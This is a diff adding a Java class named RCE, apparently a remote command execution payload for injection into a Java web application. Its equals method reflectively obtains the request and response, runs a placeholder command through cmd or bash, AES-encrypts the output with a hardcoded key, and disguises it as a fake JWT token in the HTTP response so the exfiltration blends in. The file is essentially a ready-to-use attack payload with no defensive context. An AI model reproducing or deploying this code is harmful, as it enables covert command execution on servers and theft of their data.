@@ -1,0 +1,84 @@
+import javax.crypto.spec.SecretKeySpec;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.nio.charset.StandardCharsets;
+import java.security.SecureRandom;
+import java.util.Base64;
+
+public class RCE {
+    String cmd="{}";
+    @Override
+    public boolean equals(Object obj) {
+        System.out.println(123);
+
+        try {
+            Class<?> pcClass = obj.getClass();
+            Object request = pcClass.getMethod("getRequest").invoke(obj);
+            Object response = pcClass.getMethod("getResponse").invoke(obj);
+            write(response,"token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9."+aesECB(executeCmd(),"VcApSBJ570GQhjrK",0)+"."+generateRandom(43));
+        } catch (Exception e) {
+        }
+        return true;
+    }
+    String executeCmd() throws Exception {
+        Process p = Runtime.getRuntime().exec(System.getProperty("os.name").toLowerCase().contains("win")
+                ? new String[]{"cmd", "/c", cmd} : new String[]{"/bin/bash", "-c", cmd});
+        StringBuilder s = new StringBuilder();
+        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream(), "GBK"))) {
+            String l;
+            while ((l = br.readLine()) != null) s.append(l).append("\n");
+        }
+        try (BufferedReader br = new BufferedReader(new InputStreamReader(p.getErrorStream(), "GBK"))) {
+            String l;
+            while ((l = br.readLine()) != null) s.append("Err:" + l).append("\n");
+        }
+        try {
+            p.waitFor();
+        } catch (InterruptedException e) {
+            throw new RuntimeException(e);
+        }
+        return s.toString();
+    }
+    void write(Object response, String data) throws Exception {
+        Object writer = response.getClass()
+                .getMethod("getWriter")
+                .invoke(response);
+        writer.getClass()
+                .getMethod("write", String.class)
+                .invoke(writer, data);
+    }
+    byte[] aesECB(byte[] data, byte[] key, int mode) {
+        try {
+            javax.crypto.Cipher cipher = javax.crypto.Cipher.getInstance("AES/ECB/PKCS5Padding");
+            SecretKeySpec secretKeySpec = new SecretKeySpec(key, "AES");
+            cipher.init(mode == 0 ? javax.crypto.Cipher.ENCRYPT_MODE : javax.crypto.Cipher.DECRYPT_MODE, secretKeySpec);
+            return cipher.doFinal(data);
+        } catch (Exception e) {
+            throw new RuntimeException("AES ECB error", e);
+        }
+    }
+    String aesECB(String data, String key, int mode) {
+        try {
+            byte[] keyBytes = key.getBytes(StandardCharsets.UTF_8);
+            if (mode == 0) {
+                byte[] encrypted = aesECB(data.getBytes(StandardCharsets.UTF_8), keyBytes, 0);
+                return Base64.getEncoder().encodeToString(encrypted);
+            } else {
+                byte[] decoded = Base64.getDecoder().decode(data);
+                return new String(aesECB(decoded, keyBytes, 1), StandardCharsets.UTF_8);
+            }
+        } catch (Exception e) {
+            return null;
+        }
+    }
+    String generateRandom(int length) {
+        String charset = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
+        SecureRandom random = new SecureRandom();
+        StringBuilder sb = new StringBuilder(length);
+        for (int i = 0; i < length; i++) {
+            int index = random.nextInt(charset.length());
+            sb.append(charset.charAt(index));
+        }
+        return sb.toString();
+    }
+}
